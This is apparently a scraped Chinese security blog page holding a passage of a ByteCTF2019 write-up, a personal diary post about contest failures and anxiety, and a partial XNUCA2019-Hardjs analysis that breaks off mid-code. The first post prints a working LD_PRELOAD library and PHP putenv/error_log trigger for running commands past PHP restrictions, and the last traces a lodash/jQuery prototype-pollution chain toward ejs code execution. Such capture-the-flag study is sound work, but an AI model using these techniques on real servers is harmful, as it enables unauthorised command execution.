<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"/readflag &gt; flag"</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc -shared hack -o hack.so</span><br></pre></td></tr></table></figure>

<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/hack.so"</span>);</span><br><span class="line">error_log(<span class="string">''</span>,<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将生成的hack.so放到html目录，引入后通过error_log(第二个参数为1)执行命令，拿到flag.</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/07/ByteCTF2019/" data-id="ckabsu37u000hkkvr2r6x66nn" class="article-share-link" data-share="baidu" data-title="ByteCTF2019">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/07/ByteCTF2019/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-自然选择号-前进四" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/29/%E8%87%AA%E7%84%B6%E9%80%89%E6%8B%A9%E5%8F%B7-%E5%89%8D%E8%BF%9B%E5%9B%9B/" class="article-date">
  <time datetime="2019-09-29T12:50:03.000Z" itemprop="datePublished">2019-09-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/29/%E8%87%AA%E7%84%B6%E9%80%89%E6%8B%A9%E5%8F%B7-%E5%89%8D%E8%BF%9B%E5%9B%9B/">自然选择号 前进四</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一直都有想写一篇随笔的想法，但是也没抽出时间来，今晚就先将学习暂且放下，写一些自己的内心想法来缓解一下自己的心情吧。</p>
<h3 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h3><p>这个九月对我来说，是一段难过，自闭，无奈的九月。</p>
<p><strong>8.18 踏上火车，离开家乡</strong></p>
<p><img src="https://s2.ax1x.com/2019/09/29/uGCCPU.jpg" alt="uGCCPU.jpg"></p>
<p>很幸运这次换到了24小时的火车，不再是36小时的车程了。一路昏昏沉沉，看到下铺那个长相可爱的女孩子和她男友的幸福样子，心里自然也有些羡慕，羡慕归羡慕，现实的冰冷瞬间将我从幻想中拉了出来，我还有补考工作和大作业以及200左右的课时点要去做，还需要准备一下过几天的XNUCA(当时很希望可以进决赛)，抱起火车上的枕头，又昏昏的睡了过去。</p>
<p><strong>8.18 终于到了南昌</strong></p>
<p>和家乡20度的温差还真是令人一时间无法接受，吹着炎热的夏风，略感疲倦的向学校走去。</p>
<p><strong>8.23 室友们陆续到了寝室，开始实训生活</strong></p>
<p>开始了漫长的且<del>无用</del>的实训生活，早上七点匆匆起床，来不及吃上早点就奔去教室，在嘈杂与喧闹中度过一天，晚上六点再次回到寝室，学习一些自己想学习的知识</p>
<p><strong>9.1 实训结束，开始正式上课</strong></p>
<p>…..</p>
<p>…..</p>
<p>时间线在匆忙中似乎已经到了九月末，此时的我略有些绝望，有时确实会感叹弱校与强校的差距，但这毕竟是现实，还是先说说这段时间的经历吧</p>
<ul>
<li>比赛情况：</li>
</ul>
<p>第五空间，ogeek，中关村创新比赛，XNUCA高校网安….，在这段时间所举行的所有赛事，没有一个成功进入决赛。</p>
<p>某审核，连续两次比赛无输出。</p>
<ul>
<li>生活情况：</li>
</ul>
<p>此时的我越来越焦虑，烦躁，一次一次的失败让我感觉有一些无奈和无力。</p>
<p>同时高中的心理问题再次复发：在接触内心认为是 “沙雕” 的人后，感觉非常难受，可能碰到一次后，会洗手十分钟到二十分钟，碰到衣服甚至想当场把衣服撕碎，每天没由来的烦躁不安。</p>
<p>从开始的不太接受熬夜，开始慢慢进行熬夜。</p>
<p>因为补考，虽然占着一个奖学金名额，但最终无法拿到奖学金，室友还是很优秀，一个特等，一个一等，（我真菜</p>
<p>和保研的学长聊了一下，学校的推免的问题，学长说最好绩点还是要达到3左右，光是竞赛是很难推免的，但是我上学期已经补考了orz…需要进行绩点补救的过程了。</p>
<p>身体素质感觉也变得很差，感觉有的时候接近抑郁了。</p>
<ul>
<li>感情情况</li>
</ul>
<p>我这个人似乎也没有什么感情邂逅，唯一令我疑惑不解的就是高中很喜欢的一个女孩子，前几天晚上的时候我翻说说的时候看到她和家乡一个技校的男生在一起了，我也没有什么看不起技校的观点，只是有些感叹：”年年岁岁花相似，岁岁年年人不同”。</p>
<p>有时候会想，为什么那几天会很难过呢，可能是没有真正的放下吧，我也不知道我是算痴情还是偏执，思考了一个晚上，最终将她的所有一切联系方式全部删除了，在某次大扫除中，也将她送给我的那本书扔掉了，脱手的那一瞬间，我扔掉的是什么呢，难道只是那个礼物吗，或许扔掉的是我的部分青春吧。</p>
<h3 id="一些反思"><a href="#一些反思" class="headerlink" title="一些反思"></a>一些反思</h3><p>也很久没有进行自我反思了，借着这个机会反思一下最近的生活，也反思一下自己。</p>
<p>时间如白驹过隙，恍惚间一年的时间过去了，也到了大二了。</p>
<p>收获了很多，也失去了很多，以往遇到一些有趣的事情，会想着分享给身边要好的人，现在点下分享按键，又会点击取消，不知该分享跟谁，大家似乎也都有了自己的生活，来往和交集也越来越少，只是偶尔寒暄几句，又匆匆道别，所有人似乎都陌生了一些，似乎我自己也是吧。</p>
<p>比赛的问题令人倒是很无奈，有些时候真的很羡慕那些强队，而我们还在为了一个实验室的建设而头疼(平时连一个学习的地方都找不到)，第五空间和xnuca因为二进制方面的问题，都和决赛差一点，每次比赛的时候，似乎感觉队伍是在抱着必不可能进决赛的想法去打..有点无奈，有时候不禁会抱怨一下…只和奖金和奖项差了那么一点点，但是为什么不去思考一下自己的原因呢，如果我在xnuca中能再弄出Hardjs不就可以进决赛了吗，如果在第五空间前，了解一下webin，那么二进制方面未必不能做出一道题，可能就进入决赛了，可惜这一切都是如果，最终还是个人能力的不足，我没有理由也没有能力去埋怨其他人。</p>
<p>我也试着每天努力的去克服自己的心理问题，在每一次心理对抗后，都感觉疲惫不堪</p>
<p>或许这就是生活吧，真的很让人难过，也很累。</p>
<p>或许在不断的绝望中，依然可以去抓住希望才是真正的生活吧，在生活中构建出自己心中的意义，去学习自己所热爱的东西，做自己喜欢的事情，正所谓</p>
<blockquote>
<p>世界上只有一种真正的英雄主义，就是认清了生活的真相后还依然热爱它</p>
</blockquote>
<p>接受生活给你的痛苦，起身再次前进，才正是要做的事情，少接触无意义的事情，多做一些有价值的，有趣的事情，是非成败转头空，青山依旧在，几度夕阳红。</p>
<p>寻找正确的方向，继续前行。</p>
<p>自然选择号，前进四。</p>
<p>​                                                                                                                                             2019.9.29</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/09/29/%E8%87%AA%E7%84%B6%E9%80%89%E6%8B%A9%E5%8F%B7-%E5%89%8D%E8%BF%9B%E5%9B%9B/" data-id="ckabsu39e0046kkvr01mp2jei" class="article-share-link" data-share="baidu" data-title="自然选择号 前进四">Share</a>
      

      
        <a href="http://yoursite.com/2019/09/29/%E8%87%AA%E7%84%B6%E9%80%89%E6%8B%A9%E5%8F%B7-%E5%89%8D%E8%BF%9B%E5%9B%9B/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-XNUCA2019-Hardjs" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/25/XNUCA2019-Hardjs/" class="article-date">
  <time datetime="2019-09-25T10:28:44.000Z" itemprop="datePublished">2019-09-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/25/XNUCA2019-Hardjs/">XNUCA2019-Hardjs</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这篇文章主要是对XNUCA-Hardjs的分析</p>
<h3 id="jQuery-extend-CVE-2019-11358"><a href="#jQuery-extend-CVE-2019-11358" class="headerlink" title="jQuery.extend CVE-2019-11358"></a>jQuery.extend CVE-2019-11358</h3><p>再jQuery&lt;3.4.0的版本中存在此原型链污染漏洞，不过这个漏洞影响的只是前端解析，所以需要配合一些其他的姿势出打出一些很棒的漏洞效果，这道题对这个漏洞的利用就很微妙。</p>
<p>在extend点可触发，如下</p>
<p>function getAll(allNode){</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">	url:<span class="string">"/get"</span>,</span><br><span class="line">	type:<span class="string">"get"</span>,</span><br><span class="line">	<span class="keyword">async</span>:<span class="literal">false</span>,</span><br><span class="line">	success: <span class="function"><span class="keyword">function</span>(<span class="params">datas</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">			$.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">		&#125;</span><br><span class="line">		 <span class="built_in">console</span>.log(allNode);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>extend语句说明如下</p>
<p>jQuery.extend() 函数用于将一个或多个对象的内容合并到目标对象。</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nxPKFP.png" alt="nxPKFP.png"></p>
<p>有点类似于merge，jQuery小于3.4的版本都可以通过这个方法来触发原型链污染</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这道题是有两种做法的，第一种是通过ejs进行rce，第二种通过前端+后端的组合拳拿flag(这个组合利用太强了)</p>
<h4 id="通过ejs进行rce"><a href="#通过ejs进行rce" class="headerlink" title="通过ejs进行rce"></a>通过ejs进行rce</h4><p>首先可以npm audit查看一下漏洞，可以清楚看到是存在原型链污染的</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nxiD4P.png" alt="nxiD4P.png"></p>
<p>这道题首先要审计的是server.js，题目中关键漏洞代码如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/get"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> userid = req.session.userid ; </span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">"select count(*) count from `html` where userid= ?"</span></span><br><span class="line"><span class="comment">// var sql = "select `dom` from  `html` where userid=? ";</span></span><br><span class="line"><span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">    res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">    <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">    <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">        lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        ret.push(doms);</span><br><span class="line">        res.json(ret);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.json([&#123;&#125;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Return recorder is less than 5,so return it without merge."</span>);</span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select `dom` from  `html` where userid=? "</span>;</span><br><span class="line">    <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.length ; i++)&#123;</span><br><span class="line">        ret.push(<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(ret);</span><br><span class="line">    res.json(ret);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这段代码的逻辑如下：<br>首先判断datalist[0]中的记录条数，也就是RowDataPacket的数量，这点打断电进去可以看的更详细一些，接着往下说，这里会根据datalist[0]的数量来选择下一步进行的操作，如果大于5，进入如下代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line"><span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"><span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">    lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line"><span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    ret.push(doms);</span><br><span class="line">    res.json(ret);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json([&#123;&#125;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这段代码的意思，出题人也提示了我们，首先把数据查出来，然后通过循环遍历，将raws中的dom通过lodash.defaultDeep赋给doms，这里的JSON.parse应该是起了很大的助攻的，简单看一个例子</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nxW1C8.png" alt="nxW1C8.png"></p>
<p>本来我们给doms应该是下面这样的数组，但是通过上面这样我们可以传过去类似一个多维数组这样去导致原型链污染，后面大概就是一些基操了，先删除对应id的，然后再插入信息，少于5条的判断也就不再赘述了。但是这里是只有原型链污染的，在server.js中是没有可触发的点的，<strong>我们还需要找到一个未被定义的，但是被调用了的一个变量</strong>，所以这里可能在ejs中产生污染，毕竟是用它去渲染的，然后可以跟进一处渲染点，如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    res.render(<span class="string">'login_register'</span>,&#123;</span><br><span class="line"></span><br><span class="line">        title:<span class="string">" storeHtml | logins "</span>,</span><br><span class="line"></span><br><span class="line">        buttonHintF:<span class="string">"登 录"</span>,</span><br><span class="line"></span><br><span class="line">        buttonHintS:<span class="string">"没有账号?"</span>,</span><br><span class="line"></span><br><span class="line">        hint:<span class="string">"登录"</span>,</span><br><span class="line"></span><br><span class="line">        next:<span class="string">"/register"</span></span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>跟进分析一下</p>
<p>首先进入responce.js中的render方法</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="keyword">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="keyword">this</span>.req;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">  .....</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>进入app.render   </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="keyword">this</span>.cache;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> engines = <span class="keyword">this</span>.engines;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line"></span><br><span class="line">  .....</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>跟进tryRender</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进view.render</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">View.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">options, callback</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  debug(<span class="string">'render "%s"'</span>, <span class="keyword">this</span>.path);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.engine(<span class="keyword">this</span>.path, options, callback);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>进入engine方法，这里才到了调用ejs</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exports.renderFile = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  .......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>跟进tryHandleCache</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryHandleCache</span>(<span class="params">options, data, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  ......</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      result = handleCache(options)(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> cb(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">cb(<span class="literal">null</span>, result);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进handleCache</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleCache</span>(<span class="params">options, template</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.filename;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span>;</span><br><span class="line">  ....</span><br><span class="line">  func = exports.compile(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    exports.cache.set(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进exports.compile</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exports.compile = <span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params">template, opts</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> templ;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line">  templ = <span class="keyword">new</span> Template(template, opts);</span><br><span class="line">  <span class="keyword">return</span> templ.compile();</span><br></pre></td></tr></table></figure>

<p>这里new了一个Template对象，跟进去看一下</p>
<p>这个function Template里面的变量很满足原型链污染触发的亚子</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">opts = opts || &#123;&#125;;</span><br><span class="line"> <span class="keyword">var</span> options = &#123;&#125;;</span><br><span class="line"> <span class="keyword">this</span>.templateText = text;</span><br><span class="line"> <span class="keyword">this</span>.mode = <span class="literal">null</span>;</span><br><span class="line"> <span class="keyword">this</span>.truncate = <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">this</span>.currentLine = <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">this</span>.source = <span class="string">''</span>;</span><br><span class="line"> <span class="keyword">this</span>.dependencies = [];</span><br><span class="line"> options.client = opts.client || <span class="literal">false</span>;</span><br><span class="line"> options.escapeFunction = opts.escape || opts.escapeFunction || 